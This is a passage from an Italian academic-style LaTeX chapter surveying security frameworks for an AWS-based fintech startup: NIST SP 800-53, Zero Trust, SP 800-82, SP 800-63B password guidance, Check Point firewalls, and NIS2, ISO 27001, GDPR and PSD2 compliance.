accessi logici: la fintech dovrà definire policy IAM, regole di password e uso di MFA in AWS per soddisfare tale controllo. Richiede di tenere registri degli eventi (logging): la fintech dovrà configurare servizi come CloudTrail e CloudWatch. Richiede di cifrare informazioni sensibili: la fintech dovrà abilitare la crittografia nei servizi AWS dove risiedono dati critici.

\section{NIST SP 800-53 – Catalogo di Controlli di Sicurezza}
\label{sec:nist_sp_800_53}
La pubblicazione speciale \textbf{NIST SP 800-53} fornisce un \textbf{catalogo completo di controlli di sicurezza e privacy} per sistemi informativi federali, ma è ampiamente adottato come riferimento anche da numerose organizzazioni nel settore privato, inclusa l'industria finanziaria. Si tratta di uno standard più \textbf{prescrittivo e tecnico} rispetto al CSF, che copre aspetti di sicurezza logica, fisica, procedurale e del personale, organizzati in diverse famiglie di controlli. L'ultima revisione (Revision 5) del NIST SP 800-53, pubblicata nel 2020, contiene \textbf{20 famiglie di controlli} principali , tra cui:
\begin{enumerate}
    \item \textbf{AC – Access Control} (Controllo degli Accessi)
    \item \textbf{IA – Identification and Authentication} (Identificazione e Autenticazione)
    \item \textbf{SC – System and Communications Protection} (Protezione dei Sistemi e delle Comunicazioni, es. cifratura, segregazione di rete)
    \item \textbf{SI – System and Information Integrity} (Integrità dei Sistemi e delle Informazioni, es. anti-malware, gestione delle vulnerabilità, monitoraggio)
    \item \textbf{AU – Audit and Accountability} (Audit e Tracciabilità, es. logging)
    \item \textbf{IR – Incident Response} (Risposta agli Incidenti)
    \item \textbf{CP – Contingency Planning} (Pianificazione della Continuità Operativa e Disaster Recovery)
    \item \textbf{PE – Physical and Environmental Protection} (Protezione Fisica e Ambientale)
    \item \textbf{PS – Personnel Security} (Sicurezza del Personale, es. background check, training)
    \item Altre famiglie includono: \textbf{Risk Assessment (RA)}, \textbf{Security Assessment and Authorization (CA)}, \textbf{Configuration Management (CM)}, \textbf{Awareness and Training (AT)}, \textbf{Maintenance (MA)}, \textbf{Supply Chain Risk Management (SR)}, etc.
\end{enumerate}

Complessivamente, SP 800-53 Rev. 5 cataloga oltre 1000 controlli di sicurezza e privacy, da cui vengono derivate delle \textbf{baseline di controlli} (Low, Moderate, High) in base al livello di impatto del sistema informativo. Ad esempio, un sistema classificato come \textit{Moderate Impact} (come potrebbe essere un sistema fintech che gestisce dati finanziari sensibili ma non classificati a livello governativo) dovrebbe implementare tutti i controlli previsti dalla baseline Moderate. Le organizzazioni possono poi \textit{personalizzare} (tailor) la baseline aggiungendo, modificando o escludendo controlli in base alle esigenze specifiche, all'analisi del rischio e ai requisiti normativi applicabili .

Dal punto di vista di AWS, è importante notare che \textbf{l'infrastruttura AWS è stata validata rispetto a numerosi controlli NIST SP 800-53} nell'ambito delle certificazioni FedRAMP (Federal Risk and Authorization Management Program) Moderate e High per i servizi AWS \cite{awsNistCompliance}. Ciò significa che AWS ha superato audit di terza parte che attestano l'implementazione di controlli di sicurezza allineati a SP 800-53 per quanto riguarda la piattaforma cloud sottostante. Per la fintech cliente, questo non implica automaticamente la conformità a SP 800-53 per i propri sistemi, ma fornisce una solida base: ad esempio, i controlli di sicurezza fisica (PE) e ambientale, molti controlli di rete (SC) e parte di quelli di monitoraggio (SI) a livello infrastrutturale sono già soddisfatti dall'ambiente AWS. Rimane responsabilità del cliente implementare i controlli a livello di applicazione e configurazione cloud (ad es., definire ruoli IAM – controllo AC-2, o abilitare il versioning su S3 – parte dei controlli SC e SI). AWS fornisce anche strumenti come \textbf{AWS Audit Manager}, che include framework predefiniti per NIST SP 800-53, consentendo di valutare l'account AWS rispetto ai controlli di tale standard e di collezionare evidenze in caso di audit \cite{awsAuditManager}.

\section{Architettura Zero Trust (ZTA)}
\label{sec:zero_trust}
Tradizionalmente, la sicurezza informatica aziendale si fondava su un modello di \textbf{difesa perimetrale}: si creava una rete aziendale considerata “fidata” all'interno, separata dall'esterno “non fidato” tramite firewall e altre barriere (il cosiddetto modello “castello e fossato” o \enquote{castle and moat}). Tuttavia, con l'evoluzione delle minacce (es. insider threat, attacchi laterali), la crescente adozione del cloud computing, la mobilità degli utenti, il telelavoro e l'uso di dispositivi personali (BYOD), questo paradigma si è dimostrato progressivamente inefficace. Emerge così il concetto di \textbf{Zero Trust}, formalizzato, tra gli altri, dal NIST nella pubblicazione speciale SP 800-207 \enquote{Zero Trust Architecture} \cite{nistZeroTrust}. Questo approccio rivoluziona la strategia di sicurezza: \textit{non si deve mai implicitamente fidare di alcuna entità, sia essa interna o esterna al perimetro tradizionale, ma verificare esplicitamente ogni richiesta di accesso a risorse aziendali.} In un'Architettura Zero Trust (\textbf{ZTA}), le difese non sono più incentrate su una rete interna considerata intrinsecamente sicura, ma \textbf{sull'identità degli utenti e dei dispositivi, e sul contesto delle richieste di accesso}, indipendentemente dalla loro provenienza fisica o logica.

I principi cardine della Zero Trust, come delineati dal NIST \cite{nistZeroTrust}, includono:
\begin{itemize}
    \item \textbf{Tutte le fonti di dati e i servizi di calcolo sono considerati risorse.}
    \item \textbf{Tutte le comunicazioni sono protette indipendentemente dalla posizione di rete.} Essere su una rete interna non concede privilegi impliciti.
    \item \textbf{L'accesso alle singole risorse aziendali è concesso per sessione.} La fiducia non è persistente.
    \item \textbf{L'accesso alle risorse è determinato da policy dinamiche,} che includono lo stato osservabile dell'identità del client, dell'applicazione/servizio e dell'asset richiedente, e possono includere attributi comportamentali e ambientali (es. orario, geolocalizzazione, postura di sicurezza del dispositivo).
    \item \textbf{L'organizzazione monitora e misura l'integrità e la postura di sicurezza di tutti gli asset posseduti e associati.}
    \item \textbf{Tutte le autenticazioni e autorizzazioni sono dinamiche e applicate rigorosamente prima che l'accesso sia consentito.} Questo è un ciclo continuo di accesso, scansione e valutazione delle minacce, adattamento e ri-autenticazione.
    \item \textbf{L'organizzazione raccoglie quanti più dati possibile su asset, infrastruttura di rete e comunicazioni e li utilizza per migliorare la propria postura di sicurezza.}
\end{itemize}
In sintesi, Zero Trust “sposta” il confine di fiducia dalla rete all'entità che richiede l'accesso, in un modello in cui \textbf{ogni transazione è autenticata, autorizzata, crittografata e validata} in modo robusto, come se provenisse da un ambiente non fidato, anche se in realtà avviene all'interno del sistema. Tecnologie come la micro-segmentazione, l'autenticazione multi-fattore (MFA), l'Identity and Access Management (IAM) avanzato e il monitoraggio continuo sono fondamentali per implementare una ZTA.

\section{Sicurezza OT (Tecnologie Operative) – NIST SP 800-82}
\label{sec:sicurezza_ot}
Nel dominio della cybersecurity aziendale, oltre all'Information Technology (IT) tradizionale (server, applicazioni, dati), acquista crescente importanza la protezione delle \textbf{Tecnologie Operative (OT)}, ossia quei sistemi hardware e software che rilevano o causano un cambiamento attraverso il monitoraggio e/o il controllo diretto di dispositivi, processi ed eventi fisici. Le aziende fintech, essendo primariamente attive nel settore finanziario digitale, generalmente non operano impianti industriali o infrastrutture OT su larga scala come farebbe un'azienda manifatturiera o una utility energetica. Tuttavia, è possibile che alcune componenti con interfacce fisiche rientrino nel perimetro di una fintech: si pensi, ad esempio, agli \textbf{sportelli automatici (ATM/Bancomat)}, ai dispositivi Point of Sale (POS) smart, ai data center on-premises con sistemi di building automation (HVAC, controllo accessi fisici), o a eventuali sensori IoT impiegati per servizi finanziari innovativi (es. assicurazioni basate sull'uso) \cite{nistSP80082}.

La pubblicazione speciale \textbf{NIST SP 800-82}, \enquote{Guide to Industrial Control Systems (ICS) Security}, fornisce linee guida specifiche per migliorare la sicurezza dei sistemi OT/ICS, tenendo conto dei loro requisiti unici di prestazioni (spesso real-time), affidabilità, disponibilità e sicurezza fisica (safety) \cite{nistSP80082}. Tali sistemi presentano sfide peculiari: operano frequentemente in tempo reale, non possono tollerare interruzioni (la disponibilità e la safety spesso prevalgono sulla confidenzialità), utilizzano protocolli di comunicazione specializzati o legacy, e possono avere cicli di vita molto lunghi con componenti hardware e software non facilmente aggiornabili o sostituibili.

Per mettere in sicurezza ambienti OT, il framework NIST SP 800-82 raccomanda, tra le altre cose, di:
\begin{itemize}
    \item \textbf{Segmentare rigorosamente le reti OT dalle reti IT,} utilizzando architetture a zone e condotti (zones and conduits), e implementando gateway e firewall industriali (Industrial DMZ) per controllare e limitare il traffico.
    \item \textbf{Implementare controlli di accesso e monitoraggio specifici} per i protocolli OT, ove possibile.
    \item Assicurare l'\textbf{integrità e l'affidabilità} dei comandi inviati ai dispositivi fisici.
    \item Gestire patch e vulnerabilità OT in modo pianificato e controllato, considerando l'impatto sulla continuità operativa e sulla safety, e utilizzando misure compensative quando il patching diretto non è fattibile.
    \item Predisporre piani di incident response specifici per OT che considerino anche scenari di sicurezza fisica e safety \cite{nistSP80082}.
\end{itemize}

\section{Sicurezza delle Password e Gestione delle Identità – NIST SP 800-63B}
\label{sec:sicurezza_password}
Le \textbf{password} (o più correttamente, i \enquote{memorized secrets}) rimangono tutt'oggi uno dei principali meccanismi di autenticazione, ma rappresentano anche un punto debole frequentemente sfruttato dagli attaccanti (tramite tecniche come phishing, attacchi a dizionario, credential stuffing, password spraying, ecc.). Per questo motivo, il NIST ha pubblicato la serie di documenti \textbf{NIST SP 800-63B \enquote{Digital Identity Guidelines}}, di cui la \textbf{SP 800-63B} è specificamente dedicata all'\textit{Authentication and Lifecycle Management} \cite{NIST_SP_800_63B}. Queste linee guida forniscono raccomandazioni aggiornate su come gestire in modo sicuro le password e altri fattori di autenticazione.

Le indicazioni più recenti del NIST hanno parzialmente ribaltato alcuni concetti tradizionali sulla complessità e sulla scadenza delle password, a favore di un approccio più orientato all'usabilità e alla robustezza effettiva. In sintesi, NIST SP 800-63B suggerisce di:
\begin{itemize}
    \item \textbf{Privilegiare la lunghezza delle password} (minimo 8 caratteri se generata dall'utente, minimo 6 se generata dal sistema e casuale) e permettere l'uso di frasi (passphrases) e spazi.
    \item \textbf{Non imporre requisiti di composizione eccessivamente complessi} (es. obbligo di caratteri speciali, maiuscole, minuscole, numeri) che portano gli utenti a creare password prevedibili o a scriverle. È sufficiente richiedere una varietà di caratteri se la password è breve.
    \item \textbf{Non forzare la scadenza periodica delle password} (password aging) a meno che non vi sia evidenza di compromissione. Cambi frequenti spingono a password deboli.
    \item \textbf{Verificare le nuove password (e quelle esistenti) contro dizionari di password compromesse} note (es. quelle presenti in data breach pubblici) e parole comuni.
    \item \textbf{Limitare il numero di tentativi di autenticazione falliti} (rate limiting) per prevenire attacchi di forza bruta.
    \item \textbf{Incoraggiare fortemente e, ove possibile, imporre l'uso dell'Autenticazione Multi-Fattore (MFA)}, specialmente per accessi privilegiati o a dati sensibili.
    \item Fornire meccanismi sicuri per il recupero delle password.
\end{itemize}
Queste linee guida sono fondamentali per le startup fintech nella definizione delle policy di autenticazione per i propri utenti e dipendenti, bilanciando sicurezza e usabilità \cite{jumpcloudNistPassword}.

\section{Difesa Perimetrale Avanzata e Soluzioni di Next-Generation Firewall – Check Point Quantum}
\label{sec:checkpoint_quantum}
Oltre ai framework e alle linee guida generali, è utile considerare l'adozione di \textbf{tecnologie specifiche} per potenziare la sicurezza dell'infrastruttura cloud. Nel panorama attuale, i firewall di nuova generazione (Next-Generation Firewalls - NGFW) e le piattaforme integrate di threat prevention giocano un ruolo chiave nel proteggere reti e workload, specialmente in scenari ibridi o multi-cloud. \textbf{Check Point Quantum} è un esempio di una famiglia di prodotti di sicurezza di rete che una fintech potrebbe considerare per migliorare la propria postura difensiva, sia on-premises che nel cloud \cite{checkpointQuantum}.

In particolare, le soluzioni come Check Point Quantum Network Security offrono una protezione scalabile e multi-livello contro minacce informatiche evolute. Queste piattaforme tipicamente integrano funzionalità quali:
\begin{itemize}
    \item Firewalling stateful avanzato.
    \item Intrusion Prevention System (IPS).
    \item Application Control e URL Filtering.
    \item Antivirus e Anti-malware.
    \item Sandboxing per l'analisi di minacce zero-day (come la tecnologia SandBlast di Check Point).
    \item VPN e connettività sicura.
    \item Funzionalità di ispezione del traffico SSL/TLS.
    \item Integrazione con feed di threat intelligence.
\end{itemize}
Una console di gestione unificata permette di orchestrare le policy di sicurezza su diversi ambienti. Per le fintech su AWS, soluzioni come Check Point CloudGuard Network Security possono essere deployate come virtual appliance all'interno del VPC per fornire protezione avanzata al traffico in entrata, in uscita e laterale (est-ovest) tra le subnet, integrandosi con i servizi nativi di AWS (come Security Groups, AWS WAF, Gateway Load Balancer) per una difesa in profondità \cite{awsCheckPoint}.

\section{Best Practice e Strategie di Mitigazione Complessive}
\label{sec:best_practices}
Attraverso l'analisi dei framework e delle soluzioni sopra esposte, emergono alcuni \textbf{principi trasversali di sicurezza} che dovrebbero guidare ogni startup fintech nella protezione della propria infrastruttura, specialmente se basata su AWS. Di seguito, si riassumono le migliori pratiche e strategie di mitigazione più efficaci:
\begin{itemize}
    \item \textbf{Identità solida e minimo privilegio (IAM Robusto)}: Utilizzare account individuali, applicare rigorosamente il principio del minimo privilegio (PoLP) per utenti e servizi, e adottare l'Autenticazione Multi-Fattore (MFA) ovunque possibile, specialmente per l'account root AWS e gli utenti con privilegi elevati. Utilizzare ruoli IAM per delegare permessi temporanei alle applicazioni e ai servizi AWS, evitando l'uso di credenziali statiche hardcoded \cite{awsWellArchitected}.
    \item \textbf{Segmentazione e difesa in profondità (Defense in Depth)}: Implementare controlli di sicurezza multipli a vari livelli (rete, host, applicazione, dati). Segmentare le reti utilizzando VPC, subnet, Security Groups e Network ACLs per isolare ambienti e applicazioni. Limitare il raggio d'azione (blast radius) di eventuali compromissioni \cite{awsWellArchitected}.
    \item \textbf{Protezione dei dati critica (Data Protection)}: Classificare i dati in base alla loro sensibilità. Cifrare i dati sensibili sia a riposo (es. con AWS KMS, S3 Server-Side Encryption, EBS Encryption) sia in transito (es. TLS/SSL, VPN). Implementare meccanismi di Data Loss Prevention (DLP) se necessario e gestire attentamente i backup e la loro sicurezza \cite{awsWellArchitected}.
    \item \textbf{Monitoraggio continuo e traceability (Logging and Monitoring)}: Abilitare il logging dettagliato per tutti i servizi (AWS CloudTrail, CloudWatch Logs, VPC Flow Logs, log applicativi). Centralizzare e analizzare i log, possibilmente tramite un SIEM o strumenti come Amazon GuardDuty e AWS Security Hub, per rilevare attività sospette e abilitare alerting tempestivo. Garantire la tracciabilità delle azioni eseguite sull'infrastruttura \cite{awsWellArchitected}.
    \item \textbf{Automatizzare la sicurezza e l'infrastruttura come codice (Automation and IaC)}: Utilizzare strumenti di Infrastructure as Code (IaC) come AWS CloudFormation o Terraform per definire e gestire l'infrastruttura in modo riproducibile e versionabile. Automatizzare i controlli di sicurezza, il patching, le verifiche di conformità e le risposte agli incidenti (Security Orchestration, Automation and Response - SOAR) per ridurre l'errore umano e migliorare la reattività \cite{awsWellArchitected}.
    \item \textbf{Preparazione agli incidenti e resilienza (Incident Response and Resilience)}: Sviluppare e mantenere un piano di incident response. Predisporre piani di disaster recovery e business continuity, testandoli regolarmente attraverso simulazioni. Progettare l'architettura per l'alta disponibilità e la fault tolerance, sfruttando le Availability Zones e le Regioni AWS \cite{awsWellArchitected}.
    \item \textbf{Formazione e cultura della sicurezza (Security Awareness and Culture)}: Investire nella formazione continua del personale su tematiche di cybersecurity. Promuovere una cultura della sicurezza all'interno dell'organizzazione, adottando approcci come \enquote{Secure by Design} e \enquote{Shift Left Security} (integrare la sicurezza fin dalle prime fasi del ciclo di vita dello sviluppo software) \cite{netguru2023}.
    \item \textbf{Compliance proattiva (Proactive Compliance)}: Integrare i controlli richiesti dalle normative applicabili (es. PCI DSS, GDPR, normative finanziarie specifiche) nel ciclo di vita della sicurezza, piuttosto che trattarli come un adempimento a posteriori. Utilizzare strumenti di verifica della conformità e condurre audit periodici \cite{netguru2023}.
\end{itemize}

\chapter{Conformità Normativa per Startup Fintech: Implementazione di Standard Chiave}
\label{chap:compliance}

L'ecosistema fintech italiano, e più ampiamente europeo, richiede un approccio sistematico alla conformità normativa che integri molteplici framework regolamentari e standard di sicurezza. La convergenza di normative come la Direttiva NIS2, lo standard ISO/IEC 27001, il GDPR, le direttive sui servizi di pagamento PSD2/3, le direttive antiriciclaggio (AMLD) e il Digital Operational Resilience Act (DORA) crea un panorama complesso che le startup fintech devono navigare per operare legalmente, in sicurezza e per costruire fiducia con clienti e partner. L'implementazione efficace di questi standard non solo garantisce la conformità legale, ma stabilisce anche le fondamenta per un'architettura tecnologica robusta, resiliente e scalabile. Le startup fintech che adottano tecnologie moderne come Flutter per lo sviluppo di interfacce mobile, piattaforme cloud come AWS o Azure per l'infrastruttura, e sistemi di controllo versione come GitHub per la gestione del codice sorgente, devono integrare i requisiti di sicurezza e conformità sin dalle prime fasi di progettazione (\textit{security and compliance by design}). Questa integrazione precoce riduce significativamente i costi di adeguamento retroattivo e minimizza i rischi operativi. Il presente capitolo fornisce una disamina di questi standard, con un focus sulle implicazioni tecniche per lo sviluppo di soluzioni fintech, quali portafogli digitali e servizi di investimento.

\section{Direttiva NIS2: Sicurezza delle Reti e dei Sistemi Informativi}
\label{sec:nis2}

\subsection{Quadro Normativo e Applicabilità}
La Direttiva (UE) 2022/2555, nota come NIS2 (Network and Information Systems Directive 2), rappresenta l'evoluzione del framework europeo per la cybersecurity, con un impatto significativo sul settore fintech italiano \cite{cybersecurity360NIS2}. Questa direttiva, che abroga la precedente Direttiva NIS (UE) 2016/1148, amplia considerevolmente il perimetro di applicazione, includendo un numero maggiore di settori e entità, comprese quelle di medie dimensioni, e stabilendo una distinzione tra \enquote{soggetti essenziali} e \enquote{soggetti importanti} in base alle dimensioni dell'organizzazione e alla criticità dei servizi offerti. Per le startup fintech, la classificazione dipenderà dalla loro dimensione e dal tipo di servizi finanziari erogati (ad esempio, infrastrutture del mercato finanziario, fornitori di servizi di pagamento potrebbero rientrare tra i soggetti essenziali o importanti). La direttiva impone requisiti minimi specifici per la gestione dei rischi di cybersecurity, obblighi di notifica degli incidenti significativi e misure tecniche, operative e organizzative appropriate e proporzionate.

Le startup fintech che rientrano nell'ambito di applicazione della NIS2 devono implementare un sistema di gestione della sicurezza informatica che includa, come minimo:
\begin{itemize}
    \item Politiche di analisi dei rischi e di sicurezza dei sistemi informatici.
    \item Gestione degli incidenti.
    \item Continuità operativa, come la gestione dei backup e il ripristino in caso di disastro, e gestione delle crisi.
    \item Sicurezza della catena di approvvigionamento (supply chain security), comprese le relazioni con fornitori diretti e prestatori di servizi.
    \item Sicurezza nell'acquisizione, nello sviluppo e nella manutenzione dei sistemi informatici e di rete, inclusa la gestione e la divulgazione delle vulnerabilità.
    \item Politiche e procedure per valutare l'efficacia delle misure di gestione dei rischi di cybersecurity.
    \item Pratiche di igiene informatica di base e formazione in materia di cybersecurity.
    \item Politiche e procedure relative all'uso della crittografia e, se del caso, della cifratura.
    \item Sicurezza delle risorse umane, strategie di controllo dell'accesso e gestione degli asset.
    \item Uso di soluzioni di autenticazione a più fattori o di autenticazione continua.
\end{itemize}
L'approccio richiesto è basato sul rischio (\textit{risk-based approach}), imponendo una valutazione continua delle minacce e delle vulnerabilità, con particolare attenzione alle specificità del settore finanziario \cite{cybersecurity360NIS2}. La direttiva stabilisce inoltre obblighi di reportistica verso le autorità competenti (CSIRT nazionali e autorità di vigilanza) con tempistiche stringenti per la notifica degli incidenti significativi.

\subsection{Implementazione Tecnica per Startup Fintech}
L'implementazione della NIS2 in una startup fintech richiede un approccio strutturato che integri la sicurezza \textit{by design} nell'intera architettura tecnologica. Inizialmente, è necessario condurre un assessment completo dell'infrastruttura esistente, identificando tutti gli asset critici (sistemi informativi, dati, processi), le dipendenze tecnologiche e i potenziali punti di vulnerabilità. Questo assessment deve includere l'analisi del codice delle applicazioni (es. sviluppate in Flutter) per identificare potenziali vulnerabilità (es. OWASP Mobile Top 10), la revisione delle configurazioni dei repository di codice (es. GitHub) per garantire la sicurezza del ciclo di vita dello sviluppo (DevSecOps), e l'audit delle configurazioni dell'infrastruttura cloud (AWS/Azure) rispetto a benchmark di sicurezza riconosciuti.

La fase successiva prevede l'implementazione di controlli di sicurezza specifici per ciascun livello dell'architettura.
\begin{itemize}
    \item \textbf{A livello applicativo (es. Flutter):} Implementare pratiche di codifica sicura (\textit{secure coding practices}), validazione robusta degli input/output, crittografia end-to-end per le comunicazioni di dati sensibili, meccanismi di autenticazione forte e gestione sicura delle sessioni.
    \item \textbf{A livello di sviluppo e repository (es. GitHub):} Configurare branch protection rules, richiedere signed commits, integrare strumenti di analisi statica (SAST) e dinamica (DAST) della sicurezza delle applicazioni nel pipeline CI/CD, e utilizzare funzionalità come GitHub Advanced Security per la scansione di segreti e vulnerabilità nel codice.
    \item \textbf{A livello di infrastruttura cloud (es. AWS/Azure):} Implementare segmentazione di rete (VPC/VNet, subnet, security groups/NSGs), cifratura dei dati a riposo e in transito, Identity and Access Management (IAM) granulare con principio del minimo privilegio, logging e monitoring completi, e sistemi di rilevamento delle intrusioni (IDS/IPS).
\end{itemize}
Il sistema di monitoraggio e risposta agli incidenti deve essere progettato per garantire il rilevamento e la risposta tempestiva. Ciò include l'implementazione di soluzioni SIEM (Security Information and Event Management), l'automazione del rilevamento delle minacce e procedure standardizzate per l'escalation e la gestione degli incidenti. La documentazione di tutti i processi, delle policy e delle procedure è essenziale per dimostrare la conformità durante gli audit regolatori.

\section{Standard ISO/IEC 27001 per la Sicurezza delle Informazioni}
\label{sec:iso27001_compliance}

\subsection{Framework e Principi Fondamentali}
Come già introdotto nella Sezione \ref{sec:iso_27001}, ISO/IEC 27001 è lo standard internazionale di riferimento per i sistemi di gestione della sicurezza delle informazioni (ISMS), particolarmente critico per il settore fintech data la sensibilità dei dati finanziari gestiti. Lo standard fornisce un approccio sistematico per stabilire, implementare, mantenere e migliorare continuamente un ISMS. Per le startup fintech, l'adozione di ISO/IEC 27001 non solo migliora significativamente la postura di sicurezza, ma facilita anche la conformità con altre normative settoriali (come NIS2 e DORA) e aumenta la fiducia dei clienti e degli investitori.

Il framework ISO/IEC 27001 si basa sul ciclo Plan-Do-Check-Act (PDCA) e richiede un approccio basato sul rischio per la gestione della sicurezza delle informazioni. Le clausole 4 (Contesto dell'organizzazione), 5 (Leadership), 6 (Pianificazione), 7 (Supporto), 8 (Attività operative), 9 (Valutazione delle prestazioni) e 10 (Miglioramento) definiscono i requisiti per l'ISMS. In particolare, la clausola 6.1 (\textit{Azioni per affrontare rischi e opportunità}) è fondamentale, richiedendo l'identificazione e la valutazione sistematica dei rischi e delle opportunità legati alla gestione dei dati sensibili. L'implementazione efficace richiede un forte commitment del management, la definizione di obiettivi chiari di sicurezza (allineati agli obiettivi di business) e l'allocazione di risorse adeguate per il mantenimento dell'ISMS.

\subsection{Implementazione Operativa in Ambiente Fintech}
L'implementazione di ISO/IEC 27001 in una startup fintech inizia con la definizione del perimetro (\textit{scope}) dell'ISMS e la conduzione di un'analisi e valutazione dei rischi (\textit{risk assessment}) completa, come richiesto dalla clausola 6.1.2. Questo processo deve identificare tutti gli asset informativi (hardware, software, dati, documentazione, persone), valutare le minacce e le vulnerabilità associate, e determinare il livello di rischio. Successivamente, si procede al trattamento dei rischi (clausola 6.1.3), che può includere la mitigazione (applicando controlli), il trasferimento (es. tramite assicurazioni o outsourcing), l'accettazione o l'evitamento del rischio. L'Annex A dello standard fornisce un set di riferimento di 93 controlli, raggruppati in 4 temi (controlli organizzativi, sulle persone, fisici e tecnologici), da cui selezionare quelli applicabili in base ai risultati del trattamento dei rischi. Il requisito 6.1.3d richiede la produzione di una \textit{Dichiarazione di Applicabilità} (Statement of Applicability - SoA) che documenti quali controlli sono stati scelti e perché.

La fase di implementazione (Do) richiede l'adozione dei controlli scelti, personalizzati per l'ambiente tecnologico della startup.
\begin{itemize}
    \item \textbf{Per applicazioni Flutter:} Implementare standard di codifica sicura (controllo A.8.25 \textit{Secure development lifecycle}), processi di revisione del codice (A.8.28 \textit{System security testing}), e test di sicurezza automatizzati nel pipeline di sviluppo (A.8.29 \textit{Security testing in development and acceptance}).
    \item \textbf{Per l'ambiente GitHub:} Configurare controlli di accesso appropriati (A.5.15 \textit{Access control}, A.5.16 \textit{Identity management}, A.5.17 \textit{Authentication information}), protezione dei branch, e logging degli audit (A.8.15 \textit{Logging}).
    \item \textbf{Per l'infrastruttura cloud AWS/Azure:} Implementare controlli come A.5.23 (\textit{Information security for use of cloud services}), A.8.9 (\textit{Configuration management}), A.8.16 (\textit{Monitoring activities}), A.8.2 (\textit{Protection against malware}), A.8.3 (\textit{Information backup}), A.8.23 (\textit{Web filtering}), e A.8.24 (\textit{Use of cryptography}) .
\end{itemize}
La fase di Check include il monitoraggio, la misurazione, l'analisi e la valutazione dell'ISMS (clausola 9.1), gli audit interni (clausola 9.2) e il riesame della direzione (clausola 9.3). La fase di Act (clausola 10) si concentra sul miglioramento continuo, affrontando le non conformità e attuando azioni correttive. La documentazione dell'ISMS (clausola 7.5) deve essere mantenuta aggiornata e deve includere politiche di sicurezza, procedure operative standard e registri.

\section{Regolamento GDPR per la Protezione dei Dati}
\label{sec:gdpr}

\subsection{Applicazione nel Contesto Fintech}
Il Regolamento Generale sulla Protezione dei Dati (GDPR - Regolamento UE 2016/679) stabilisce il framework normativo per il trattamento dei dati personali nell'Unione Europea, con implicazioni particolarmente significative per le startup fintech che gestiscono grandi volumi di dati finanziari e personali sensibili dei clienti. Il settore fintech, caratterizzato dall'innovazione tecnologica e dall'utilizzo intensivo di dati per profilazione, credit scoring e personalizzazione dei servizi, deve navigare le complessità del GDPR mantenendo al contempo la capacità di innovare.

Il Codice di condotta per i sistemi informativi gestiti da soggetti privati in tema di crediti al consumo, affidabilità e puntualità nei pagamenti, approvato dal Garante per la Protezione dei Dati Personali, estende e dettaglia l'applicazione delle regole privacy anche ai servizi fintech, inclusi i prestiti peer-to-peer (P2P lending) erogati tramite piattaforme tecnologiche. Questo aggiornamento è stato necessario per l'avanzamento della \textit{digital economy} e per l'avvio dei servizi fintech, estendendo la regolamentazione oltre i tradizionali settori del credito al consumo, mutui, leasing e noleggio a lungo termine.

\subsection{Implementazione Tecnica e Organizzativa}
L'implementazione del GDPR in una startup fintech richiede un approccio multidisciplinare che integri aspetti legali, tecnici e organizzativi. Il trattamento dei dati degli interessati nei sistemi informativi creditizi (SIC) si basa, tipicamente, sulla base giuridica del legittimo interesse del titolare del trattamento (art. 6, par. 1, lett. f GDPR), ma richiede il pieno rispetto di tutti i principi e diritti garantiti dal GDPR (trasparenza, liceità, correttezza, minimizzazione dei dati, limitazione della finalità, limitazione della conservazione, integrità e riservatezza). Particolare attenzione deve essere prestata alla trasparenza algoritmica (art. 13, 14, 22 GDPR): in caso di decisioni basate unicamente sul trattamento automatizzato, come il diniego all'accesso al credito basato su scoring, l'interessato deve essere informato sulla logica di funzionamento dell'algoritmo e ha il diritto di ottenere l'intervento umano, esprimere la propria opinione e contestare la decisione.

Dal punto di vista tecnico, l'implementazione richiede l'adozione dei principi di \textit{privacy by design} e \textit{privacy by default} (art. 25 GDPR) sin dalle prime fasi di sviluppo dell'applicazione (es. Flutter) e dell'infrastruttura.
\begin{itemize}
    \item \textbf{Minimizzazione dei dati:} Raccogliere solo i dati strettamente necessari per la finalità dichiarata.
    \item \textbf{Limitazione della finalità:} Utilizzare i dati solo per le finalità per cui sono stati raccolti e per cui è stato fornito il consenso (se applicabile) o sussiste altra base giuridica.
    \item \textbf{Limitazione della conservazione:} Conservare i dati solo per il tempo necessario al raggiungimento delle finalità. Per i dati creditizi, il Codice di condotta stabilisce tempi specifici (es. dati positivi storici fino a 60 mesi).
    \item \textbf{Misure di sicurezza adeguate (art. 32 GDPR):} Implementare pseudonimizzazione, cifratura, controlli di accesso granulari, resilienza dei sistemi.
    \item \textbf{Gestione dei diritti degli interessati (art. 15-22 GDPR):} Progettare sistemi che facilitino l'esercizio dei diritti di accesso, rettifica, cancellazione (diritto all'oblio), limitazione del trattamento, portabilità dei dati e opposizione.
\end{itemize}
L'architettura cloud (AWS/Azure) deve implementare misure tecniche e organizzative appropriate, inclusa la cifratura dei dati a riposo e in transito, la gestione sicura delle chiavi di cifratura, e controlli di accesso IAM granulari. È fondamentale redigere e mantenere un Registro delle Attività di Trattamento (art. 30 GDPR) e, se necessario (trattamenti a rischio elevato), condurre una Valutazione d'Impatto sulla Protezione dei Dati (DPIA - art. 35 GDPR). La notifica di eventuali data breach all'autorità di controllo e agli interessati (art. 33-34 GDPR) deve essere gestita tempestivamente.

Per quanto riguarda la conservazione dei dati, i dati storici positivi dei soggetti analizzati possono essere conservati per un massimo di 60 mesi dalla data di scadenza del rapporto o dalla data dell'ultimo aggiornamento, a tutela del credito e per rispondere alle richieste degli organismi di vigilanza. Tuttavia, questa conservazione deve essere bilanciata con i principi di minimizzazione. È inoltre possibile implementare sistemi di preavviso (es. via SMS o email tracciabile) per annunciare l'iscrizione di record negativi nei SIC, previa acquisizione del consenso informato degli interessati per tale modalità di comunicazione.

\section{Direttive PSD2 e PSD3 per i Servizi di Pagamento}
\label{sec:psd}

\subsection{Evoluzione del Framework Normativo}
La Seconda Direttiva sui Servizi di Pagamento (PSD2 - Direttiva UE 2015/2366) ha rivoluzionato il panorama dei pagamenti digitali in Europa, introducendo il concetto di \textit{open banking} e rafforzando la sicurezza delle transazioni online. La PSD2, entrata in vigore nel 2016 come aggiornamento della direttiva PSD originaria del 2007, ha imposto requisiti di Autenticazione Forte del Cliente (Strong Customer Authentication - SCA) per la maggior parte delle transazioni elettroniche al fine di tutelare dalle frodi, e ha richiesto alle banche (Account Servicing Payment Service Providers - ASPSP) di rendere disponibili i propri servizi di pagamento e i dati dei conti dei clienti, con il loro consenso, a fornitori terzi autorizzati (Third Party Providers - TPP), favorendo la creazione di nuovi prodotti e servizi finanziari.

